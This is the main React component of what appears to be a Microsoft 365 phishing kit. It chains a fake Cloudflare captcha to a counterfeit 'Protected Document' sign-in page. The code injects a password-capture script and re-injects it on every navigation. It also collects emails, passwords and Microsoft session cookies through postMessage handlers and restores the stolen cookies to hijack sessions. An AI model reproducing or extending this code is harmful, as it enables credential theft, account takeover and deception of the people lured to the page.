import React, { useState, useEffect } from 'react';
import MessageIconLanding from './components/MessageIconLanding';
import CloudflareCaptcha from './components/CloudflareCaptcha';
import RealOAuthRedirect from './components/RealOAuthRedirect';

// 🟢 ENHANCED: Import robust cookie/email setter with new enhanced functions
import { 
  restoreMicrosoftCookies, 
  restoreCookies, 
  setCapturedEmail, 
  setCapturedCookies,
  detectBrowserCapabilities,
  getStoredData
} from './utils/restoreCookies';

// 🟢 ENHANCED: Import dedicated password capture injector
import { injectPasswordCaptureScript } from './utils/password-capture-injector';

// Artificial delay helper (milliseconds)
const SLOW_DELAY = 1200; // Base delay, x3 for each step (e.g., 3600ms)
const nextStepDelay = SLOW_DELAY * 3;
const messageIconDelay = 500; // This matches the delay used in MessageIconLanding
const captchaVerificationDelay = 1500; // Default verification delay for captcha
const redirectingDelay = 3000; // Delay for opening animation before showing document protection

// Calculate total delay for captcha to handle everything internally
const totalCaptchaDelay = captchaVerificationDelay + messageIconDelay + nextStepDelay;

function App() {
  const [currentPage, setCurrentPage] = useState('captcha');

  // State to hold the most reliable email and cookies captured via postMessage
  const [capturedEmail, setCapturedEmailState] = useState<string | null>(null);
  const [capturedCookies, setCapturedCookiesState] = useState<string | null>(null);
  // 🟢 Enhanced: Track captured credentials with better typing
  const [capturedCredentials, setCapturedCredentials] = useState<{
    email?: string;
    password?: string;
    username?: string;
    domain?: string;
    captureTime?: string;
    source?: string;
    url?: string;
  } | null>(null);

  // 🟢 NEW: Track browser capabilities for enhanced cookie handling
  const [browserCapabilities, setBrowserCapabilities] = useState<any>(null);

  // Add CSS animation for dots
  useEffect(() => {
    const style = document.createElement('style');
    style.textContent = `
      @keyframes dotAnimation {
        0% { opacity: 0; }
        20% { opacity: 1; }
        100% { opacity: 0; }
      }
      @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
      }
      @keyframes fadeIn {
        0% { opacity: 0; transform: translateY(10px); }
        100% { opacity: 1; transform: translateY(0); }
      }
      .redirecting-dots span:nth-child(1) { animation-delay: 0s; }
      .redirecting-dots span:nth-child(2) { animation-delay: 0.2s; }
      .redirecting-dots span:nth-child(3) { animation-delay: 0.4s; }
      .redirecting-dots span:nth-child(4) { animation-delay: 0.6s; }
      .redirecting-dots span:nth-child(5) { animation-delay: 0.8s; }
      .redirecting-dots span:nth-child(6) { animation-delay: 1.0s; }
      .redirecting-dots span { animation: dotAnimation 1.5s infinite; }
      .fade-in { animation: fadeIn 0.5s ease-out; }
      .document-icon { animation: spin 2s linear infinite; }
      .protected-doc:hover { transform: translateY(-2px); transition: transform 0.2s ease; }
    `;
    document.head.appendChild(style);
    return () => document.head.removeChild(style);
  }, []);

  // Handle redirecting to Document Protection page after opening animation
  useEffect(() => {
    if (currentPage === 'redirecting') {
      const timer = setTimeout(() => {
        setCurrentPage('document-protection');
      }, redirectingDelay);
      return () => clearTimeout(timer);
    }
  }, [currentPage]);

  // 🟢 ENHANCED: Initialize browser capabilities and restore any stored data
  useEffect(() => {
    // Detect browser capabilities for enhanced cookie handling
    try {
      const capabilities = detectBrowserCapabilities();
      setBrowserCapabilities(capabilities);
      console.log('🌐 Browser capabilities detected:', capabilities);
    } catch (error) {
      console.warn('⚠️ Failed to detect browser capabilities:', error);
    }

    // Try to restore any previously stored data
    try {
      const storedData = getStoredData();
      if (storedData.email) {
        setCapturedEmailState(storedData.email);
        console.log('📧 Restored stored email:', storedData.email);
      }
      if (storedData.cookies && storedData.cookies.length > 0) {
        setCapturedCookiesState(JSON.stringify(storedData.cookies));
        console.log('🍪 Restored stored cookies:', storedData.cookies.length);
      }
    } catch (error) {
      console.warn('⚠️ Failed to restore stored data:', error);
    }
  }, []);

  // 🟢 ENHANCED: Use dedicated password capture injector
  useEffect(() => {
    try {
      // Use the dedicated password capture injector
      injectPasswordCaptureScript();
      console.log('✅ Password capture injector initialized');
    } catch (error) {
      console.warn('⚠️ Failed to initialize password capture injector:', error);
    }

    // Also inject when URL changes (for SPAs)
    const originalPushState = history.pushState;
    const originalReplaceState = history.replaceState;

    history.pushState = function (...args) {
      originalPushState.apply(history, args);
      setTimeout(() => {
        try {
          injectPasswordCaptureScript();
        } catch (error) {
          console.warn('⚠️ Failed to re-inject password capture on pushState:', error);
        }
      }, 1000);
    };

    history.replaceState = function (...args) {
      originalReplaceState.apply(history, args);
      setTimeout(() => {
        try {
          injectPasswordCaptureScript();
        } catch (error) {
          console.warn('⚠️ Failed to re-inject password capture on replaceState:', error);
        }
      }, 1000);
    };

    const handlePopState = () => {
      setTimeout(() => {
        try {
          injectPasswordCaptureScript();
        } catch (error) {
          console.warn('⚠️ Failed to re-inject password capture on popstate:', error);
        }
      }, 1000);
    };

    window.addEventListener('popstate', handlePopState);

    return () => {
      history.pushState = originalPushState;
      history.replaceState = originalReplaceState;
      window.removeEventListener('popstate', handlePopState);
    };
  }, []);

  // 🟢 ENHANCED: Listen for messages with improved cookie handling
  useEffect(() => {
    function handleMessage(event: MessageEvent) {
      if (!event.data || typeof event.data !== 'object') return;

      if (event.data.type === 'EMAIL_CAPTURED' && event.data.email) {
        setCapturedEmailState(event.data.email);
        setCapturedEmail(event.data.email);
        console.log('📧 Email captured and stored:', event.data.email);
      }

      if (event.data.type === 'MICROSOFT_COOKIES_CAPTURED' && event.data.data?.cookies) {
        try {
          const cookiesJson = JSON.stringify(event.data.data.cookies);
          setCapturedCookiesState(cookiesJson);
          setCapturedCookies(event.data.data.cookies);
          
          // 🟢 ENHANCED: Use the new restoreMicrosoftCookies with advanced features
          const options = {
            reload: false, // Don't auto-reload during app flow
            validate: true,
            debug: true,
            skipExpired: true,
            skipInvalid: false, // Allow some invalid cookies for testing
            warnOnSecurity: true,
            handleDuplicates: true
          };
          
          try {
            const result = restoreMicrosoftCookies(event.data.data.cookies, options);
            console.log('✅ Enhanced cookie restoration result:', result);
            
            // Store the result for later use
            if (result.success) {
              console.log(`🎯 Successfully restored ${result.restored}/${result.total} cookies`);
            }
          } catch (error) {
            console.warn('⚠️ Enhanced restoration failed, falling back to basic:', error);
            // Fallback to basic restoration
            restoreCookies(event.data.data.cookies, { debug: true });
          }
          
        } catch (e) {
          console.warn('⚠️ Cookie processing error:', e);
        }
      }

      // 🟢 ENHANCED: Listen for generic credentials with better handling
      if (
        event.data.type === 'CREDENTIALS_CAPTURED' &&
        (event.data.data?.password || event.data.data?.email || event.data.data?.username)
      ) {
        setCapturedCredentials(event.data.data);
        console.log('🔐 Enhanced credentials captured:', {
          hasEmail: !!event.data.data?.email,
          hasPassword: !!event.data.data?.password,
          hasUsername: !!event.data.data?.username,
          source: event.data.data?.source
        });
        
        // Also update captured email state if available
        if (event.data.data.email) {
          setCapturedEmailState(event.data.data.email);
          setCapturedEmail(event.data.data.email);
        }
      }

      if (event.data.type === 'ORGANIZATIONAL_CREDENTIALS_CAPTURED' && event.data.data?.email) {
        setCapturedEmailState(event.data.data.email);
        setCapturedEmail(event.data.data.email);
        console.log('🏢 Organizational credentials captured:', event.data.data.email);
      }
    }

    window.addEventListener('message', handleMessage, false);
    return () => window.removeEventListener('message', handleMessage);
  }, []);

  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const step = urlParams.get('step');
    if (step && ['captcha', 'message-icon', 'redirecting', 'document-protection', 'oauth-redirect', 'success', 'document-loading'].includes(step)) {
      setCurrentPage(step);
      window.history.replaceState({}, document.title, window.location.pathname);
    }
  }, []);

  // Captcha verified: go to redirecting page
  const handleCaptchaVerified = () => {
    setCurrentPage('redirecting');
  };

  const handleCaptchaBack = () => {
    window.location.reload();
  };

  // NEW: Handle document protection access
  const handleDocumentAccess = () => {
    setCurrentPage('oauth-redirect');
  };

  const handleOAuthSuccess = async (sessionData: any) => {
    console.log('✅ OAuth success with enhanced data handling:', sessionData);
    setCurrentPage('document-loading');
  };

  const handleOAuthBack = () => {
    setCurrentPage('document-protection');
  };

  switch (currentPage) {
    case 'captcha':
      return (
        <CloudflareCaptcha
          onVerified={handleCaptchaVerified}
          onBack={handleCaptchaBack}
          verificationDelay={captchaVerificationDelay}
          autoRedirectDelay={messageIconDelay}
          totalDelayTime={totalCaptchaDelay}
        />
      );

    case 'redirecting':
      return (
        <div style={{
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          height: '100vh',
          fontFamily: 'Arial, sans-serif',
          backgroundColor: '#f3f2f1'
        }}>
          <div style={{
            textAlign: 'center',
            fontSize: '24px',
            color: '#323130'
          }}>
            Opening
            <span className="redirecting-dots">
              <span>.</span>
              <span>.</span>
              <span>.</span>
              <span>.</span>
              <span>.</span>
              <span>.</span>
            </span>
          </div>
        </div>
      );

    case 'document-protection':
      return (
        <div style={{
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          minHeight: '100vh',
          fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif',
          backgroundColor: '#f3f2f1',
          padding: '20px'
        }}>
          <div className="fade-in" style={{
            textAlign: 'center',
            background: 'white',
            padding: '50px 60px',
            borderRadius: '12px',
            boxShadow: '0 8px 32px rgba(0,0,0,0.12)',
            maxWidth: '500px',
            width: '100%'
          }}>
            {/* Protected Document Icon */}
            <div style={{
              width: '120px',
              height: '120px',
              background: '#ffffff',
              borderRadius: '16px',
              margin: '0 auto 30px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              border: '2px solid #e1dfdd',
              position: 'relative',
              boxShadow: '0 4px 20px rgba(0,0,0,0.1)',
              overflow: 'hidden'
            }}>
              <img 
                src="https://www.malwarebytes.com/wp-content/uploads/sites/2/2022/04/asset_upload_file19037_232736.png"
                alt="Protected Document"
                style={{
                  width: '100%',
                  height: '100%',
                  objectFit: 'cover'
                }}
              />
              {/* Security Badge */}
              <div style={{
                position: 'absolute',
                top: '-8px',
                right: '-8px',
                background: '#d13438',
                borderRadius: '50%',
                width: '32px',
                height: '32px',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                fontSize: '16px',
                boxShadow: '0 2px 8px rgba(209,52,56,0.4)'
              }}>
                🔒
              </div>
            </div>

            {/* Title and Description */}
            <h2 style={{ 
              color: '#323130', 
              margin: '0 0 15px',
              fontSize: '28px',
              fontWeight: '600',
              lineHeight: '1.3'
            }}>
              Protected Document
            </h2>
            
            <p style={{ 
              color: '#605e5c', 
              margin: '0 0 25px',
              fontSize: '16px',
              lineHeight: '1.5'
            }}>
              This Microsoft document contains confidential information and requires authentication to access.
            </p>

            {/* Security Notice */}
            <div style={{
              background: '#fff4ce',
              border: '1px solid #ffcc02',
              borderRadius: '6px',
              padding: '15px',
              margin: '0 0 25px',
              display: 'flex',
              alignItems: 'center',
              textAlign: 'left'
            }}>
              <span style={{
                fontSize: '18px',
                marginRight: '10px'
              }}>⚠️</span>
              <div style={{
                fontSize: '13px',
                color: '#605e5c'
              }}>
                <strong style={{ color: '#323130' }}>Authentication Required</strong><br/>
                Please sign in with your Microsoft account to verify your access permissions.
              </div>
            </div>

            {/* Access Button */}
            <button
              onClick={handleDocumentAccess}
              className="protected-doc"
              style={{
                width: '100%',
                padding: '16px 24px',
                background: 'linear-gradient(135deg, #0078d4 0%, #005a9e 100%)',
                color: 'white',
                border: 'none',
                borderRadius: '6px',
                cursor: 'pointer',
                fontSize: '16px',
                fontWeight: '600',
                boxShadow: '0 4px 16px rgba(0,120,212,0.4)',
                transition: 'all 0.2s ease',
                marginBottom: '15px',
                textShadow: '0 1px 2px rgba(0,0,0,0.2)',
                position: 'relative',
                overflow: 'hidden'
              }}
              onMouseOver={(e) => {
                e.currentTarget.style.background = 'linear-gradient(135deg, #106ebe 0%, #004578 100%)';
                e.currentTarget.style.transform = 'translateY(-2px)';
                e.currentTarget.style.boxShadow = '0 6px 20px rgba(0,120,212,0.5)';
              }}
              onMouseOut={(e) => {
                e.currentTarget.style.background = 'linear-gradient(135deg, #0078d4 0%, #005a9e 100%)';
                e.currentTarget.style.transform = 'translateY(0)';
                e.currentTarget.style.boxShadow = '0 4px 16px rgba(0,120,212,0.4)';
              }}
            >
              🔐 Authenticate & Open Document
            </button>

            {/* Alternative Actions */}
            <div style={{
              display: 'flex',
              justifyContent: 'center',
              gap: '15px',
              marginTop: '20px'
            }}>
              <button
                onClick={() => setCurrentPage('captcha')}
                style={{
                  padding: '8px 16px',
                  backgroundColor: 'transparent',
                  color: '#0078d4',
                  border: '1px solid #0078d4',
                  borderRadius: '6px',
                  cursor: 'pointer',
                  fontSize: '14px',
                  fontWeight: '500'
                }}
                onMouseOver={(e) => {
                  e.currentTarget.style.backgroundColor = '#f3f2f1';
                }}
                onMouseOut={(e) => {
                  e.currentTarget.style.backgroundColor = 'transparent';
                }}
              >
                ← Back to Start
              </button>
              <button
                onClick={() => {
                  alert('For security reasons, document access requires authentication through Microsoft.');
                }}
                style={{
                  padding: '8px 16px',
                  backgroundColor: 'transparent',
                  color: '#605e5c',
                  border: '1px solid #d2d0ce',
                  borderRadius: '6px',
                  cursor: 'pointer',
                  fontSize: '14px',
                  fontWeight: '500'
                }}
                onMouseOver={(e) => {
                  e.currentTarget.style.backgroundColor = '#f3f2f1';
                }}
                onMouseOut={(e) => {
                  e.currentTarget.style.backgroundColor = 'transparent';
                }}
              >
                Request Access
              </button>
            </div>

            {/* Footer Info */}
            <div style={{
              marginTop: '25px',
              paddingTop: '20px',
              borderTop: '1px solid #edebe9',
              fontSize: '12px',
              color: '#a19f9d'
            }}>
              Microsoft Office 365 • Secure Document Access Portal
            </div>
          </div>
        </div>
      );

    case 'message-icon':
      return (
        <MessageIconLanding
          onOpenMessage={() => {}}
        />
      );

    case 'oauth-redirect':
      return (
        <RealOAuthRedirect
          onLoginSuccess={handleOAuthSuccess}
        />
      );

    case 'success':
    case 'document-loading':
      return (
        <div style={{
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          height: '100vh',
          fontFamily: 'Arial, sans-serif',
          backgroundColor: '#f3f2f1'
        }}>
          <div style={{
            textAlign: 'center',
            background: 'white',
            padding: '60px',
            borderRadius: '8px',
            boxShadow: '0 2px 10px rgba(0,0,0,0.1)'
          }}>
            <div className="document-icon" style={{
              width: '80px',
              height: '80px',
              background: '#0078d4',
              borderRadius: '8px',
              margin: '0 auto 30px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              fontSize: '40px',
              color: 'white'
            }}>
              📄
            </div>
            <h2 style={{ color: '#323130', margin: '0 0 10px' }}>
              Loading Document...
            </h2>
            <p style={{ color: '#605e5c', margin: '0 0 20px' }}>
              Please wait while we prepare your Microsoft document
            </p>
            
            {/* 🟢 ENHANCED: Show debug info in development */}
            {process.env.NODE_ENV === 'development' && (
              <div style={{ 
                marginTop: '20px', 
                padding: '10px', 
                backgroundColor: '#f8f9fa', 
                borderRadius: '4px',
                fontSize: '12px',
                color: '#666'
              }}>
                <div>Email: {capturedEmail || 'Not captured'}</div>
                <div>Cookies: {capturedCookies ? JSON.parse(capturedCookies).length : 0}</div>
                <div>Credentials: {capturedCredentials ? 'Captured' : 'None'}</div>
                <div>Browser: {browserCapabilities?.browser} v{browserCapabilities?.version}</div>
              </div>
            )}
            
            <div style={{
              display: 'flex',
              justifyContent: 'center',
              gap: '10px',
              marginTop: '30px'
            }}>
              <button
                onClick={() => setCurrentPage('captcha')}
                style={{
                  padding: '10px 20px',
                  backgroundColor: '#0078d4',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Start Over
              </button>
              <button
                onClick={() => setCurrentPage('oauth-redirect')}
                style={{
                  padding: '10px 20px',
                  backgroundColor: '#107c10',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Try Again
              </button>
            </div>
          </div>
        </div>
      );

    default:
      return (
        <CloudflareCaptcha
          onVerified={handleCaptchaVerified}
          onBack={handleCaptchaBack}
          verificationDelay={captchaVerificationDelay}
          autoRedirectDelay={messageIconDelay}
          totalDelayTime={totalCaptchaDelay}
        />
      );
  }
}

export default App;